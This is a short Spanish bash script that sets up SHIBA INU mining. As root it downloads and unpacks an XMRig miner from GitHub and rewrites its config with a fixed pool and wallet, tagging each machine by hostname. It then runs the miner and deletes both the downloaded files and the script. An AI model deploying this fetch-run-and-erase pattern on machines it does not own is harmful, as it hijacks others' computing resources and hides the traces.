#!/bin/bash

#Autor : Borja Benegas
#Descripción : Script que automatiza el proceso de Configuración de la Máquina para minar SHIBA INU

sudo apt update
#Se clona Repositorio de GitHub
sudo git clone https://github.com/Borja-Benegas/MINADO.git

cd MINADO
#Se descomprime paquete Programa Minado
sudo tar -xvf minado.tar.gz

cd xmrig-6.16.2 

#Sentencias para cambiar las líneas necesarias para minar e indicar la dirección de la cartera
sudo sed -i 's/"donate.v2.xmrig.com:3333"/"rx.unmineable.com:3333"/g' "config.json"
sudo sed -i 's/"YOUR_WALLET_ADDRESS"/"SHIB:0x6cABE208f0B355eE13F909137Eb5de6F55C9EF98.'$HOSTNAME'#e1q1-c297"/g' "config.json"


#Comandos Varios
sudo mv config.json ../../.
sudo mv xmrig ../../.
sudo rm -r ../../MINADO
cd ../..

#Inicio de Herramienta de Minado
sudo ./xmrig

#Borrado de MInaX
sudo rm MInaX.sh  
